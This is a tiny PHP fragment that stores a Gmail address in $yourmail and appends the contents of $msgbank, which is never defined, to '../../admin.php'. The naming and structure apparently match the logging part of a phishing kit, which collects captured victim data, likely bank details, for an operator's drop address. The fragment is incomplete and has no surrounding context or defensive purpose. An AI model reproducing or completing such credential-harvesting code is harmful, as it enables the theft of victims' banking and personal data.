<?php

$yourmail  = 'jamesdevli56@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>